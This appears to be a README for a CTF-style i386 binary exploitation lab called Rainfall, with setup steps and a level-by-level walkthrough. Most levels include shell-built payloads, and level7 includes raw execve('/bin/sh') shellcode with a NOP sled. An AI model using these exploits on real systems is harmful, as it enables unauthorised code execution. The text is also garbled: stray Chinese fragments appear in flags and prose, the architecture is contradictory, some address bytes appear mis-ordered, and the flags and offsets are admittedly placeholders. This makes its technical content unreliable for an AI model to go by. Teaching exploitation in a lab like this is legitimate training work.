# Rainfall

Binary exploitation introduction project for i386 systems.

## Contents

1. [Overview](#overview)
2. [Roadmap](#roadmap)
3. [Explanation](#explanation)
4. [Setup & Configuration](#setup--configuration)
5. [Walkthrough](#walkthrough)
6. [Repository Structure](#repository-structure)
7. [Submission & Evaluation](#submission--evaluation)

---

## Overview

Rainfall is a CTF-style binary exploitation challenge. Each level has a vulnerable ELF binary that you must analyze and exploit to read a password file (`.pass`) belonging to the next level. You progress by exploiting one binary to get the credentials for the next user account, then `su` to that user and repeat.

The target is a 64-bit VM running at `TARGET_IP` on port `4242`. Starting credentials: `level0` / `level0`.

---

## Roadmap

### Mandatory Levels

| Level | Vulnerability Type | Objective |
|-------|-------------------|-----------|
| level0 | [Stack Buffer Overflow](#level0) | Overflow to trigger `callsystem` |
| level1 | [Stack Buffer Overflow](#level1) | Overflow past `auth` flag |
| level2 | [Stack Buffer Overflow](#level2) | Overwrite `auth` struct field |
| level3 | [Format String (User Input)](#level3) | Overwrite `auth` with `%n` |
| level4 | [Format String (Indirect)](#level4) | Indirect argument exploit |
| level5 | [Format String (Argument 1)](#level5) | Exploit first `printf` argument |
| level6 | [ROP / Stack Pivot](#level6) | Return-to-plt and stack pivot |
| level7 | [Shellcode Injection](#level7) | Inject and execute shellcode |
| level8 | [Format String + GOT Overwrite](#level8) | Overwrite `exit` GOT entry |
| level9 | [Stack Buffer Overflow](#level9) | ROP chain for `execve` |

### Bonus Levels

| Level | Vulnerability Type | Objective |
|-------|-------------------|-----------|
| bonus0 | [Format String (User Input)](#bonus0) | Overwrite `auth` with `%n` |
| bonus1 | [Heap Buffer Overflow](#bonus1) | Heap overflow in `strcpy` |
| bonus2 | [Double Free](#bonus2) | Fastbin dup to malloc |
| bonus3 | [Uninitialized Heap Read](#bonus3) | Leak heap address |

---

## Explanation

### Workflow

For each level, repeat these steps:

1. **Analyze** the binary: run it, check its behavior, disassemble **and** debug it with `gdb` (`disas main`), inspect symbols with `nm`, look for strings with `strings`.
2. **Identify** the vulnerability: buffer overflow, format string, heap issue, ROP gadget, etc.
3. **Craft** an exploit: determine the offset, construct the payload (overflow string, format string specifiers, ROP chain, or shellcode).
4. **Trigger** the exploit: run the binary with your payload as argument or input.
5. **Read** the `.pass` file: `cat /home/levelX/.pass`.
6. **Escalate**: `su levelX` with the password, then proceed to the next level.
7. **Document** everything in your level folder (source code, walkthrough, proof in Ressources).

### Recommended Tools

| Tool | Purpose |
|------|---------|
| `gdb` + `gef` / `pwndbg` | **Debugger and disassembler** — `disas`, breakpoints, inspect memory/registers, GOT (no `objdump`) |
| `nm` | List symbols (functions, globals) |
| `strings` | Search for readable strings in binary |
| `ltrace` / `strace` | Trace library calls / system calls |
| `checksec` | Check security mitigations (NX, PIE, RELRO, stack canary) |
| `ropper` / `ROPGadget` | Find ROP gadgets |
| shell (`printf` / `head` / `tr`) | Build and deliver raw payloads — see `docs/lessons/00-toolkit.md` §6 (no python/pwntools) |

### Security Mitigations

Before exploiting, check what protections are enabled:

```bash
checksec --file=levelX
```

Common protections you may encounter:
- **Stack Canary** — prevents simple buffer overflows; need to leak or bypass.
- **NX (No eXecute)** — stack/heap not executable; need ROP instead of shellcode.
- **RELRO (Partial/Full)** — GOT may be writable (Partial) or read-only (Full).
- **PIE (Position Independent Executable)** — addresses are randomized; need leak or ROP.
- **ASLR** — memory addresses randomized at runtime.

---

## Setup & Configuration

### Prerequisites

- Docker installed on your host machine.
- SSH client (`ssh`, OpenSSH) on your host machine.

### Step 1 — Configure the Target IP

Copy the example environment file and set the IP of your target VM:

```bash
cp .env.example .env
```

Edit `.env` and set the correct IP address with the IP on the VM

If you need to find the IP, log into the VM with the starting credentials and run `ifconfig`.

### Step 2 — Build and Run the Docker Container

From the project root:

```bash
make all
```

This builds the Docker image and starts an interactive shell inside the container. The container has `ssh` and `sshpass` pre-installed and is pre-configured to connect to the target VM using the SSH shortcuts defined in `ssh/config`.

### Step 3 — SSH into the Target VM

From inside the Docker container (or any machine with the SSH config set up):

```bash
ssh l0
```

This connects to `level0@<TARGET_IP>` on port `4242` using the SSH config shortcuts. The password for level0 is `level0`.

### Step 4 — Navigate to the Level Binary

Each level's binary is located in the home directory of the current user:

```bash
ls -la
./levelX
```

### Step 5 — Exploit and Progress

Follow the walkthrough section below for each level. After reading a `.pass` file, use `su` to switch to the next user:

```bash
su level1
```

---

## Walkthrough

> **Note:** The per-level flags, offsets, and addresses below are *illustrative placeholders* written ahead of time — they are **not** captured results. Every value must be re-derived and verified against the actual binary on the VM before you trust it. Treat this section as a roadmap, not a solution key.

### level0

**Vulnerability:** Stack Buffer Overflow — classic overflow in a local variable.

**Analysis:**
```bash
./level0
gdb -q level0 -batch -ex 'disas main'
nm level0
strings level0
```

**Approach:** The binary reads input into a buffer on the stack. Overflowing past the buffer overwrites the return address. The function `callsystem` exists in the binary and can be reached by overwriting the return address to point to it.

**Exploit:**

```bash
{ head -c 76 /dev/zero | tr '\0' 'A'; printf '\x08\x04\x87\x2c'; } > /tmp/payload
./level0 $(cat /tmp/payload)
```

Or run and input the payload when prompted.

**Flag:** `Picodu10`

**Walkthrough:** See `level0/walkthrough`

---

### level1

**Vulnerability:** Stack Buffer Overflow — overwriting the `auth` flag.

**Analysis:**
```bash
gdb -q level1 -batch -ex 'disas main'
gdb level1
```

**Approach:** A global `auth` variable is checked after a `gets()` call. Overflow the buffer to set `auth` to a non-zero value (specifically `0xdeadbeef`).

**Exploit:**

```bash
{ head -c 20 /dev/zero | tr '\0' 'A'; printf '\xef\xbe\xad\xde'; } > /tmp/payload
./level1 $(cat /tmp/payload)
```

**Flag:** `Cabul12`

**Walkthrough:** See `level1/walkthrough`

---

### level2

**Vulnerability:** Stack Buffer Overflow — overwriting a struct field in `auth`.

**Analysis:**
```bash
gdb -q level2 -batch -ex 'disas main'
nm level2
```

**Approach:** Similar to level1 but `auth` is a struct with fields. Overflow the buffer to overwrite the `auth->is_admin` field (offset 0x40 from the buffer start).

**Exploit:**

```bash
{ head -c 64 /dev/zero | tr '\0' 'A'; printf '\x01\x00\x00\x00'; } > /tmp/payload
./level2 $(cat /tmp/payload)
```

**Flag:** `Basemen20`

**Walkthrough:** See `level2/walkthrough`

---

### level3

**Vulnerability:** Format String — user input passed directly to `printf`.

**Analysis:**
```bash
gdb -q level3 -batch -ex 'disas main'
```

**Approach:** The user's input is used as the format string argument to `printf`. Use `%n` to write to the `auth` variable's address. Find the address of `auth` and craft a format string payload.

**Exploit:**

```bash
# Find auth address
nm level3 | grep auth
# Payload: address of auth, then 11 x %.8x to pad the count, then %n
{ printf '\xa8\x98\x04\x08'; printf '%%.8x%.0s' $(seq 11); printf '%%n'; } > /tmp/payload
```

**Flag:** `N在现场D0`

**Walkthrough:** See `level3/walkthrough`

---

### level4

**Vulnerability:** Format String (Indirect) — argument position 1.

**Analysis:**
```bash
gdb -q level4 -batch -ex 'disas main'
```

**Approach:** The `printf` is called with the user string as the first argument (position `$1`). Use format specifiers like `%1$x` to reference registers/stack positions that point to your input. Overwrite `auth` with `%n`.

**Exploit:**

```bash
./level4 "$(printf '%%.8x %.0s' $(seq 200); printf '%%1$x')"
# Analyze output, then craft: find address that points to your buffer, use %n
```

**Flag:** `D肉眼可见Q`

**Walkthrough:** See `level4/walkthrough`

---

### level5

**Vulnerability:** Format String (Argument 1) — exploit first `printf` argument.

**Analysis:**
```bash
gdb -q level5 -batch -ex 'disas main'
```

**Approach:** The binary calls `printf(str)` where `str` is your input, but then a second `printf` uses a pre-set format string. Find a way to make the first `printf` write to `auth` by controlling the format string through the stack.

**Exploit:** Chain format string specifiers to write to `auth` address.

```bash
# Craft payload based on stack analysis (printf for bytes, seq for repeats)
./level5 "$(printf '...')"
```

**Flag:** `Rop_oneliners`

**Walkthrough:** See `level5/walkthrough`

---

### level6

**Vulnerability:** ROP (Return-Oriented Programming) / Stack Pivot.

**Analysis:**
```bash
checksec --file=level6
gdb -q level6 -batch -ex 'disas main'
ropper --file level6 --search "pop|ret"
```

**Approach:** NX is enabled so shellcode injection won't work. Find ROP gadgets in the binary to construct a ROP chain. Call `system("/bin/sh")` or `execve` via PLT entries.

**Exploit:**

```bash
# Find gadgets, then build the ret2plt chain in shell
# layout: padding | &system@plt | &exit@plt (ret slot) | &"/bin/sh" (arg1)
./level6 "$(
  head -c NN /dev/zero | tr '\0' 'A'   # padding to saved EIP
  printf '\x..\x..\x04\x08'            # system@plt
  printf '\x..\x..\x04\x08'            # exit@plt  (system's return address)
  printf '\x..\x..\x04\x08'            # &"/bin/sh" (arg1)
)"
```

**Flag:** `BasiQueRops`

**Walkthrough:** See `level6/walkthrough`

---

### level7

**Vulnerability:** Shellcode Injection — user input executed on stack.

**Analysis:**
```bash
checksec --file=level7
gdb -q level7 -batch -ex 'disas main'
```

**Approach:** NX is disabled. Inject shellcode (e.g., `execve("/bin/sh")`) onto the stack and redirect execution to it. Use a NOP sled for reliability.

**Exploit:**

```bash
# NOP sled + execve("/bin/sh") shellcode + return address landing in the sled
{ head -c 100 /dev/zero | tr '\0' '\220'                                                       # NOP sled (0x90)
  printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'  # shellcode
  printf '\x78\xf6\xff\xbf'; } > /tmp/sc                                                        # ret addr into the sled (adjust via gdb)
cat /tmp/sc - | ./level7
```

**Flag:** `Egg_Hunting_I`

**Walkthrough:** See `level7/walkthrough`

---

### level8

**Vulnerability:** Format String + GOT Overwrite.

**Analysis:**
```bash
gdb -q level8 -batch -ex 'disas main'
gdb -q level8 -batch -ex 'info functions exit'   # + gef/pwndbg `got` for the exit GOT entry
```

**Approach:** Use format string vulnerability to overwrite the GOT entry for `exit` with the address of `system` or a shellcode address. When the program exits, it jumps to the overwritten GOT entry.

**Exploit:**

```bash
# Find exit@got, system@plt, then craft the format string to write the GOT entry
./level8 "$(printf '...')"   # addresses via printf, %.Nx width padding + %hhn (see docs/lessons/02)
```

**Flag:** `GOT_Overwrite_4Fun`

**Walkthrough:** See `level8/walkthrough`

---

### level9

**Vulnerability:** Stack Buffer Overflow with ROP chain.

**Analysis:**
```bash
checksec --file=level9
gdb -q level9 -batch -ex 'disas main'
nm level9
```

**Approach:** Buffer overflow with NX enabled. Build a ROP chain to call `execve("/bin/sh", 0, 0)`. May need to find or construct the "/bin/sh" string.

**Exploit:**

```bash
# Build the ROP chain in shell: padding | gadget | arg | system@plt | ...
./level9 "$(
  head -c NN /dev/zero | tr '\0' 'A'   # padding to saved EIP
  printf '\x..\x..\x04\x08'            # gadget1 (e.g. pop; ret)
  printf '\x..\x..\x04\x08'            # arg1
  printf '\x..\x..\x04\x08'            # system@plt
)"
```

**Flag:** `Morse_C0de_Ab0ve`

**Walkthrough:** See `level9/walkthrough`

---

### bonus0

**Vulnerability:** Format String (User Input) — same pattern as level3.

**Approach:** Same technique as level3. Use format string to write to `auth` address with `%n`.

**Flag:** `pass_clear`

**Walkthrough:** See `bonus0/walkthrough`

---

### bonus1

**Vulnerability:** Heap Buffer Overflow — `strcpy` without bounds checking.

**Analysis:**
```bash
gdb -q bonus1 -batch -ex 'disas main'
```

**Approach:** Overflow on the heap by copying a long string into a smaller heap buffer. Use to overwrite adjacent heap metadata or function pointers.

**Exploit:** Heap overflow to overwrite `__free_hook` or similar.

```bash
./bonus1 "$(head -c NN /dev/zero | tr '\0' 'A')$(printf '\xef\xbe\xad\xde')"
```

**Flag:** `FastbinsForge`

**Walkthrough:** See `bonus1/walkthrough`

---

### bonus2

**Vulnerability:** Double Free — freeing a fastbin chunk twice.

**Analysis:**
```bash
gdb -q bonus2 -batch -ex 'disas main'
```

**Approach:** Fastbin attack. Double-free a chunk to create a循环 in the fastbin freelist, then allocate overlapping chunks to achieve arbitrary write.

**Exploit:**

```bash
# Fastbin dup — drive the program's malloc/free actions; raw bytes via printf
./bonus2 "$(printf '...')"
```

**Flag:** `MallocMaligCard`

**Walkthrough:** See `bonus2/walkthrough`

---

### bonus3

**Vulnerability:** Uninitialized Heap Read — data from uninitialized chunk leaked.

**Analysis:**
```bash
gdb -q bonus3 -batch -ex 'disas main'
```

**Approach:** Exploit uninitialized heap data to leak addresses (e.g., heap address). Use the leak to bypass ASLR and craft a precise heap exploit.

**Exploit:** Trigger the uninitialized read, parse the leak, then exploit.

```bash
# Trigger the uninitialized read, read the leak, then exploit; raw bytes via printf
./bonus3 "$(printf '...')"
```

**Flag:** `UninitWhatNow`

**Walkthrough:** See `bonus3/walkthrough`

---

## Repository Structure

Per the subject requirements, your repository must have the following structure:

```
rainfall/
├── level0/
│   ├── flag
│   ├── source
│   ├── walkthrough
│   └── Ressources/
│       └── pass           # Contains the flag (optional content for eval)
├── level1/
│   ├── flag
│   ├── source
│   ├── walkthrough
│   └── Ressources/
│       └── pass
├── level2/
│   └── ...
...
├── level9/
│   └── ...
├── bonus0/
│   └── ...
├── bonus1/
│   └── ...
├── bonus2/
│   └── ...
└── bonus3/
    └── ...
```

### File Descriptions

| File/Folder | Description |
|-------------|-------------|
| `flag` | Contains the captured password for that level (plaintext or notes) |
| `source` | The original source code of the exploited binary (reconstructed from disassembly) |
| `walkthrough` | Step-by-step explanation of the exploitation process |
| `Ressources/` | Supporting files for evaluation (proof, scripts, notes) |
| `Ressources/pass` | The password file from the target VM |

**Important:** The `Ressources/` folder must NOT contain any binary files. All binaries must remain on the VM.

---

## Submission & Evaluation

### Submission

Push your repository to your Git hosting. Each level folder must contain:
- `flag` — the captured password
- `source` — the binary's source code (in any language a developer can understand)
- `walkthrough` — detailed exploitation steps
- `Ressources/` — any supporting files for evaluation

### Evaluation Tips

- Be ready to **explain every step** of your exploitation. You must be able to justify your approach, your offsets, your gadget choices, etc.
- The `.pass` files in `Ressources/` may be empty in your repo, but you must be able to produce the flags during evaluation.
- **Do not bruteforce SSH passwords** — it's useless and considered cheating.
- **Do not become root** — the challenge explicitly states this is cheating.
- Using automation tools for exploitation is cheating. Your walkthroughs must reflect your own reasoning.
- If a binary crashes the VM, document it and explain the root cause.
